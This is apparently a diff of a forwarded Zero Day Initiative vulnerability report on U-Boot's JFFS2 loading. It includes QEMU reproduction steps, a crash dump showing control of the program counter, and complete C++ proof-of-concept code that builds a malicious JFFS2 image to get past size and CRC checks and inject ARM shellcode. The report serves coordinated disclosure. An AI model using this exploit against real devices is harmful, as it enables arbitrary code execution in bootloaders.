+git clone https://github.com/cailiwei/flashimg
+cd flashimg
+=2E/autogen.sh
+=2E/configure
+make
+cp ~/workspace/mini2440_qemu/mini2440-buildroot/output/images/u-boot.bin ~/=
+flashimg
+g++ poc.cpp -o poc
+=2E/poc
+echo -e "root\t0x4000\t0x00000000">part.txt
+=2E/flashimg -s 64M -t nand -f nand.bin -p part.txt -w root,test -z 512
+qemu-system-arm -M mini2440 -serial stdio -mtdblock nand.bin -usbdevice mou=
+se
+```
+
+- In QEMU, type the following commands:
+
+```
+fsload
+ls
+go 0x32700000
+```
+
+- The output should look like the following
+
+```
+MINI2440 # fsload
+### JFFS2 loading 'uImage' to 0x32000000
+Scanning JFFS2 FS: . done.
+load: Failed to read inode
+### JFFS2 LOAD ERROR<0> for uImage!
+MINI2440 # go 0x32700000
+## Starting application at 0x32700000 ...
+qemu: fatal: Trying to execute code outside RAM or ROM at 0x12345678
+
+R00=3D00000001 R01=3D33d5fb70 R02=3D00000041 R03=3D00000006
+R04=3D33d5fb70 R05=3D00000002 R06=3D32700000 R07=3D00000000
+R08=3D33d5ffdc R09=3D00000001 R10=3D00000000 R11=3D33d5fbfd
+R12=3D00000020 R13=3D33d5fb4c R14=3D33f8c4e8 R15=3D12345678
+PSR=3D600001d3 -ZC- A svc32
+Aborted (core dumped)
+```
+
+Note: R15 is $pc and it has been modified to 0x12345678
+
+poc.cpp:
+
+```c
+#include <stdio.h>
+#include <stdlib.h>
+#include <cstdint>
+#include <cstring>
+#include <string.h>
+#include <ctype.h>
+#include <sys/stat.h>
+using namespace std;
+#define JFFS2_MAGIC_BITMASK  0x1985
+#define JFFS2_NODE_ACCURATE  0x2000
+#define JFFS2_FEATURE_INCOMPAT  0xC000
+#define JFFS2_FEATURE_RWCOMPAT_DELETE  0x0000
+#define JFFS2_NODETYPE_DIRENT  (JFFS2_FEATURE_INCOMPAT | JFFS2_NODE_ACCURAT=
+E | 1)
+#define JFFS2_NODETYPE_INODE  (JFFS2_FEATURE_INCOMPAT | JFFS2_NODE_ACCURATE=
+ | 2)
+#define JFFS2_NODETYPE_CLEANMARKER  (JFFS2_FEATURE_RWCOMPAT_DELETE | JFFS2_=
+NODE_ACCURATE | 3)
+enum
+  {
+    DT_UNKNOWN =3D 0,
+# define DT_UNKNOWN     DT_UNKNOWN
+    DT_FIFO =3D 1,
+# define DT_FIFO        DT_FIFO
+    DT_CHR =3D 2,
+# define DT_CHR         DT_CHR
+    DT_DIR =3D 4,
+# define DT_DIR         DT_DIR
+    DT_BLK =3D 6,
+# define DT_BLK         DT_BLK
+    DT_REG =3D 8,
+# define DT_REG         DT_REG
+    DT_LNK =3D 10,
+# define DT_LNK         DT_LNK
+    DT_SOCK =3D 12,
+# define DT_SOCK        DT_SOCK
+    DT_WHT =3D 14
+# define DT_WHT         DT_WHT
+  };
+uint32_t crc32(unsigned char* ptr,uint32_t Size)
+{
+
+  uint32_t crcTable[256],crcTmp1;
+  for (int i=3D0; i<256; i++)
+   {
+    crcTmp1 =3D i;
+    for (int j=3D8; j>0; j--)
+     {
+      if (crcTmp1&1) crcTmp1 =3D (crcTmp1 >> 1) ^ 0xEDB88320L;
+       else crcTmp1 >>=3D 1;
+    }
+
+     crcTable[i] =3D crcTmp1;
+   }
+  int32_t crcTmp2=3D 0;
+  while(Size--)
+  {
+    crcTmp2 =3D ((crcTmp2>>8) & 0x00FFFFFF) ^ crcTable[ (crcTmp2^(*ptr)) & =
+0xFF ];
+    ptr++;
+  }
+  return (crcTmp2^0xFFFFFFFF)^0xFFFFFFFF;
+}
+struct Jffs2_unknown_node
+{
+            int16_t magic;
+            int16_t nodetype;
+            int32_t totlen;
+            int32_t hdr_crc;
+};
+struct Jffs2_raw_dirent
+{
+            int16_t magic;
+            int16_t nodetype;
+            int32_t totlen;
+            int32_t hdr_crc;
+            int32_t pino;
+            int32_t version;
+            int32_t ino;
+            int32_t mctime;
+            int8_t nsize;
+            int8_t type;
+            int8_t unused[2];
+            int32_t node_crc;
+            int32_t name_crc;
+};
+struct Jffs2_raw_inode
+{
+            int16_t magic;
+            int16_t nodetype;
+            int32_t totlen;
+            int32_t hdr_crc;
+            int32_t ino;
+            int32_t version;
+            int32_t mode;
+            int16_t uid;
+            int16_t gid;
+            int32_t isize;
+            int32_t atime;
+            int32_t mtime;
+            int32_t ctime;
+            int32_t offset;
+            int32_t csize;
+            int32_t dsize;
+            int8_t compr;
+            int8_t usercompr;
+            int16_t flags;
+            int32_t data_crc;
+            int32_t node_crc;
+};
+int main(void)
+{
+        //PAYLOAD CONFIG
+        char TARGET_FILENAME []=3D "uImage";
+        uint32_t TARGET_OFFSET =3D 0x700000;
+        uint32_t TARGET_LENGTH =3D 0x8;
+        unsigned char PAYLOAD[]=3D "\x04\xf0\x1f\xe5\x78\x56\x34\x12"; //ld=
+r $pc,0x12345678
+        //
+        FILE *fp =3D fopen("poc.jffs2","wb");
+        uint16_t padding =3D 0xFFFF;
+        Jffs2_unknown_node node;
+        node.magic =3D JFFS2_MAGIC_BITMASK;
+        node.nodetype =3D JFFS2_NODETYPE_CLEANMARKER;
+        node.totlen =3D sizeof(node);
+        node.hdr_crc =3D crc32((unsigned char*)&node,sizeof(Jffs2_unknown_n=
+ode)-4);
+        fwrite(&node,1,sizeof(node),fp);
+        Jffs2_raw_dirent dirent;
+        dirent.magic =3D JFFS2_MAGIC_BITMASK;
+        dirent.nodetype =3D JFFS2_NODETYPE_DIRENT;
+        dirent.totlen =3D sizeof(dirent)+strlen(TARGET_FILENAME);
+        dirent.hdr_crc =3D crc32((unsigned char*)&dirent,sizeof(Jffs2_unkno=
+wn_node)-4);
+        dirent.pino =3D 1;
+        dirent.version =3D 0;
+        dirent.ino =3D 2;
+        dirent.mctime =3D 0;
+        dirent.nsize =3D strlen(TARGET_FILENAME);
+        dirent.type =3D DT_REG;
+        dirent.unused[0] =3D 0;
+        dirent.unused[1] =3D 0;
+        dirent.mctime =3D 0;
+        dirent.node_crc =3D crc32((unsigned char*)&dirent,sizeof(Jffs2_raw_=
+dirent)-8);
+        dirent.name_crc =3D crc32((unsigned char*)TARGET_FILENAME,strlen(TA=
+RGET_FILENAME));
+        fwrite(&dirent,1,sizeof(dirent),fp);
+        fwrite(TARGET_FILENAME,1,strlen(TARGET_FILENAME),fp);
+        fwrite(&padding,1,sizeof(padding),fp);
+        Jffs2_raw_inode inode;
+        inode.magic =3D JFFS2_MAGIC_BITMASK;
+        inode.nodetype =3D JFFS2_NODETYPE_INODE;
+        inode.totlen =3D sizeof(inode)+sizeof(PAYLOAD)-1;
+        inode.hdr_crc =3D crc32((unsigned char*)&inode,sizeof(Jffs2_unknown=
+_node)-4);
+        inode.ino =3D 2;
+        inode.version =3D 1;
+        inode.mode =3D 0x81A4;
+        inode.uid =3D 0;
+        inode.gid =3D 0;
+        inode.isize =3D 0xFFFFFFFF; //bypass size limit
+        inode.atime =3D 0;
+        inode.mtime =3D 0;
+        inode.ctime =3D 0;
+        inode.offset =3D TARGET_OFFSET;
+        inode.csize =3D 0; //bypass crc32 check
+        inode.dsize =3D TARGET_LENGTH;
+        inode.compr =3D 0;
+        inode.usercompr =3D 0;
+        inode.flags =3D 0;
+        inode.data_crc =3D 0; //bypass crc32 check
+        inode.node_crc =3D crc32((unsigned char*)&inode,sizeof(Jffs2_raw_in=
+ode)-8);
+        fwrite(&inode,1,sizeof(inode),fp);
+        fwrite(&PAYLOAD,1,sizeof(PAYLOAD)-1,fp);
+        fwrite(&padding,1,sizeof(padding),fp);
+        fclose(fp);
+        return 0;
+}
+```
+
+
+-- CREDIT ---------------------------------------
+This vulnerability was discovered by:
+Aaron Luo and Spencer Hsieh of VicOne
+
+-- FURTHER DETAILS ------------------------------
+
+Supporting files:
+
+
+If supporting files were contained with this report they are provided withi=
+n a password protected ZIP file. The password is the ZDI candidate number i=
+n the form: ZDI-CAN-XXXX where XXXX is the ID number.
+
+Please confirm receipt of this report. We expect all vendors to remediate Z=
+DI vulnerabilities within 120 days of the reported date. If you are ready t=
+o release a patch at any point leading up to the deadline, please coordinat=
+e with us so that we may release our advisory detailing the issue. If the 1=
+20-day deadline is reached and no patch has been made available we will rel=
+ease a limited public advisory with our own mitigations, so that the public=
+ can protect themselves in the absence of a patch. Please keep us updated r=
+egarding the status of this issue and feel free to contact us at any time:
+
+Zero Day Initiative
+zdi-disclosures@trendmicro.com
+
+The PGP key used for all ZDI vendor communications is available from:
+
+  http://www.zerodayinitiative.com/documents/disclosures-pgp-key.asc
+
+-- INFORMATION ABOUT THE ZDI --------------------
+Established by TippingPoint and acquired by Trend Micro, the Zero Day Initi=
+ative (ZDI) neither re-sells vulnerability details nor exploit code. Instea=
+d, upon notifying the affected product vendor, the ZDI provides its Trend M=
+icro TippingPoint customers with zero day protection through its intrusion =
+prevention technology. Explicit details regarding the specifics of the vuln=
+erability are not exposed to any parties until an official vendor patch is =
+publicly available.
+
+Please contact us for further details or refer to:
+
+  http://www.zerodayinitiative.com
+
+-- DISCLOSURE POLICY ----------------------------
+
+Our vulnerability disclosure policy is available online at:
+
+  http://www.zerodayinitiative.com/advisories/disclosure_policy/
+
+TREND MICRO EMAIL NOTICE
+
+The information contained in this email and any attachments is confidential=
+ and may be subject to copyright or other intellectual property protection.=
+ If you are not the intended recipient, you are not authorized to use or di=
+sclose this information, and we request that you notify us by reply mail or=
+ telephone and delete the original message from your mail system.
+
+For details about what personal information we collect and why, please see =
+our Privacy Notice on our website at: Read privacy policy<http://www.trendm=
+icro.com/privacy>
+
+
+
+----- End forwarded message -----
 
 --=20
 Tom
 
---QKrcgseAgk70CkXu
+--SeBKNMHT+svZSLo1
+Content-Type: application/x-zip-compressed; name="ZDI-CAN-24679.zip"
+Content-Description: ZDI-CAN-24679.zip
+Content-Disposition: attachment; filename="ZDI-CAN-24679.zip"
+Content-Transfer-Encoding: base64
+
+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
+
+--SeBKNMHT+svZSLo1--
+
+--v9JJ4XFoL3Ra4iFT
 Content-Type: application/pgp-signature; name="signature.asc"
 
 -----BEGIN PGP SIGNATURE-----
 
-iQGzBAABCgAdFiEEGjx/cOCPqxcHgJu/FHw5/5Y0tywFAmai0tEACgkQFHw5/5Y0
-tyzO4AwAtPZ/cdlYXBf3JAK0jqjRTPqR3+56iAXyvuvj84xsnOtXRt7XKTgbk/G9
-gi3ZXMZO2LNwNgHGxEWuVPneSWClvTaTdeSyUDWtVhM8JkRLAu4TEGg3TZOAFpWt
-YjWIWvh4u8xVwJr3beBKr96v08lK0hChO+rU4xMWftCpM93YNldkOFqYpR8oxALS
-UC6rNbK9LG5pmgqqzkuvarxBMKYRU+lSEDA3BL1Xu2oTJPelcesUWe5T0Jv8sPa5
-TxpAyourkYw+zw/chaq5SyRQKkNvQrGRdwPOHInXvBtkD1gYkcH+19UuNK6Gz7hx
-4MZfuydEJW7t9mDAD5bFBxN920o9Bdq9MHWNY/tY/MKgJnvyHzncgD+b1yijq+ii
-m3xZ1Ul7STcApk9DHQ7uYFWvuYdyjU7KA7P1jqca4cqmLHOx0J9TaSaGR92Jn236
-L6BXufoxIUrEcLY+5310eoL6XGsq1vGgTL6Njn7xmLpTOLxA5vlQehG0nRKTycjk
-FhV2h5K4
-=y6Js
+iQGzBAABCgAdFiEEGjx/cOCPqxcHgJu/FHw5/5Y0tywFAmai1cQACgkQFHw5/5Y0
+tyzdrQv+KQVo12SY21fIObi9kpGzS1CiWuhRhAT2gfxoIzpJEzSBtT2jXfb6cWSo
+Ixun+Z6+brxGqzeEPwI3/nxtow8v7F+G5ABIJG+247lO/qmMRoTFAmHZEn608C6z
+Sljybl+u/DjYKpMX0TkDiSDVU+zEijQpNAGN3qRdSuOC1h+9XaCuBbx98AbnA0WA
+om0iC9bhjDEtdOUWsbNfgcTAwSNHDHcbPcvC3W8QUhNX9oCfGK6K6cmMqDLuVzD6
+p316TbSLBYAU5oUm7ZwpnJmg47hXxHzUIVLtSZy0UVlTEAA9oYoBqtWYTF4EdZ25
+DpBnFFlushsrhXC+JNbOC/Unp5OdN6q/STcY58YK740mUPCNWyrxpuX6LUfqxds9
+vVnJr5kqmPKe4s4wkn+YK+L8MZRyhuoyFeJw+uubIyNN8TDnm9mghivMFeGlAGv9
+Lhqy7OjAusbca+8h0aOOyfxA0Yd1RyPiOKrliNkupGdwBzdmI9fWkihjh0WkbY2d
+5JINu9OZ
+=3Ctx
 -----END PGP SIGNATURE-----
 
---QKrcgseAgk70CkXu--
+--v9JJ4XFoL3Ra4iFT--
